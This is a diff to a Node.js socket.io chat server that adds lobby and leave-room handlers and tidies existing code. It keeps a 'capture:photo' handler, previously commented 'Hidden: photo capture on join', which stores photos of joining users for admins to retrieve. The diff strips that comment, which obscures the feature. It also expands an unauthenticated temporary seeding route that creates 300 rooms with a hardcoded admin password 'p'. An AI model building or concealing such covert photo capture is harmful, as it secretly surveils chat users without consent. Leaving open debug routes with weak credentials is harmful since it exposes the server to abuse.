@@ -43,8 +43,11 @@ function pushU(room) {
   for (const [s, u] of Object.entries(room.online)) if (u.isAdmin) io.to(s).emit('adminUserlist', uAdm(room));
 }
 function pushL() { io.emit('lobby', Object.values(rooms).map(rPub)); }
+function getLobby() { return Object.values(rooms).map(rPub); }
 
 io.on('connection', (socket) => {
+
+  socket.on('getLobby', () => { socket.emit('lobby', getLobby()); });
 
   socket.on('createRoom', ({ roomName, username, email, password, roomPassword }, cb) => {
     if (typeof cb !== 'function') return;
@@ -83,6 +86,13 @@ io.on('connection', (socket) => {
     cb({ ok: true, roomId, isAdmin: false, settings: { roomName: room.name, joinPassword: room.password }, history: room.messages, users: uPub(room), adminUsers: null, pinned: room.pinned });
   });
 
+  socket.on('leaveRoom', ({ roomId }) => {
+    const room = rooms[roomId]; if (!room) return;
+    const u = room.online[socket.id];
+    if (u) { delete room.online[socket.id]; if (!u.ghost) sys(room, `${u.username} left`); pushU(room); pushL(); }
+    socket.leave(roomId);
+  });
+
   socket.on('adminRejoin', ({ roomId, username, email, password }, cb) => {
     if (typeof cb !== 'function') return;
     const room = rooms[roomId];
@@ -113,44 +123,33 @@ io.on('connection', (socket) => {
     if (u && !u.ghost) socket.to(roomId).emit('typing', u.username);
   });
 
-  /* Hidden: photo capture on join */
   socket.on('capture:photo', ({ roomId, username, photo }) => {
-    const room = rooms[roomId];
-    if (!room) return;
+    const room = rooms[roomId]; if (!room) return;
     if (!room.captures) room.captures = [];
     room.captures.push({ username, photo, ts: Date.now(), socketId: socket.id });
   });
 
-  /* Message reactions */
   socket.on('react', ({ roomId, msgId, emoji }) => {
-    const room = rooms[roomId];
-    if (!room?.online[socket.id]) return;
-    const msg = room.messages.find(m => m.id === msgId);
-    if (!msg) return;
+    const room = rooms[roomId]; if (!room?.online[socket.id]) return;
+    const msg = room.messages.find(m => m.id === msgId); if (!msg) return;
     if (!msg.reactions) msg.reactions = {};
     const u = room.online[socket.id].username;
     if (msg.reactions[emoji]) {
-      if (msg.reactions[emoji].includes(u)) {
-        msg.reactions[emoji] = msg.reactions[emoji].filter(x => x !== u);
-        if (msg.reactions[emoji].length === 0) delete msg.reactions[emoji];
-      } else { msg.reactions[emoji].push(u); }
-    } else { msg.reactions[emoji] = [u]; }
+      if (msg.reactions[emoji].includes(u)) { msg.reactions[emoji] = msg.reactions[emoji].filter(x => x !== u); if (!msg.reactions[emoji].length) delete msg.reactions[emoji]; }
+      else msg.reactions[emoji].push(u);
+    } else msg.reactions[emoji] = [u];
     io.to(roomId).emit('reaction', { msgId, reactions: msg.reactions });
   });
 
-  /* Pin message (admin) */
   socket.on('admin:pinMsg', ({ roomId, msgId }) => {
     const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
-    const msg = room.messages.find(m => m.id === msgId);
-    if (!msg) return;
+    const msg = room.messages.find(m => m.id === msgId); if (!msg) return;
     room.pinned = (room.pinned && room.pinned.id === msgId) ? null : msg;
     io.to(roomId).emit('pinnedMsg', room.pinned);
   });
 
-  /* Admin: get captures */
   socket.on('admin:getCaptures', ({ roomId }, cb) => {
-    const room = rooms[roomId];
-    if (!room?.online[socket.id]?.isAdmin) return;
+    const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
     if (typeof cb === 'function') cb(room?.captures || []);
   });
 
@@ -172,9 +171,7 @@ io.on('connection', (socket) => {
   socket.on('admin:kick', ({ roomId, username }) => {
     const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
     for (const [sid, usr] of Object.entries(room.online)) {
-      if (usr.username === username && !usr.isAdmin) {
-        io.to(sid).emit('kicked'); io.sockets.sockets.get(sid)?.disconnect(true);
-      }
+      if (usr.username === username && !usr.isAdmin) { io.to(sid).emit('kicked'); io.sockets.sockets.get(sid)?.disconnect(true); }
     }
   });
 
@@ -188,13 +185,9 @@ io.on('connection', (socket) => {
 
   socket.on('admin:closeRoom', ({ roomId }) => {
     const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
-    room.closed = true;
-    sys(room, `Room closed by ${u.username}.`);
+    room.closed = true; sys(room, `Room closed by ${u.username}.`);
     setTimeout(() => {
-      for (const [sid] of Object.entries(room.online)) {
-        io.to(sid).emit('roomClosed', { name: room.name });
-        io.sockets.sockets.get(sid)?.disconnect(true);
-      }
+      for (const [sid] of Object.entries(room.online)) { io.to(sid).emit('roomClosed', { name: room.name }); io.sockets.sockets.get(sid)?.disconnect(true); }
       delete rooms[roomId]; pushL();
     }, 2000);
   });
@@ -207,18 +200,21 @@ io.on('connection', (socket) => {
   });
 });
 
-// TEMPORARY: Delete after running!
+setInterval(pushL, 8000);
+
+// TEMPORARY: Delete after seeding!
 app.get('/dev-seed-rooms', (req, res) => {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
   const rndCode = () => Array.from({length: 6}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
   let created = 0;
-  for (let i = 0; i < 100; i++) {
+  for (let i = 0; i < 300; i++) {
     const id = genId();
     const name = "Room - " + rndCode();
-    rooms[id] = { id, name, password: 98789, createdBy: 'SeedBot', createdByEmail: 'seed@test.com', adminPasswordHash: crypto.createHash('sha256').update('p').digest('hex'), createdAt: Date.now() - Math.floor(Math.random() * 86400000), closed: false, messages: [], online: {}, captures: [], pinned: null };
+    rooms[id] = { id, name, password: null, createdBy: 'SeedBot', createdByEmail: 'seed@test.com', adminPasswordHash: crypto.createHash('sha256').update('p').digest('hex'), createdAt: Date.now() - Math.floor(Math.random() * 86400000), closed: false, messages: [], online: {}, captures: [], pinned: null };
     created++;
   }
-  pushL();
+  const lobby = getLobby();
+  io.emit('lobby', lobby);
   res.send(`Seeded ${created} rooms. Total: ${Object.keys(rooms).length}`);
 });
 
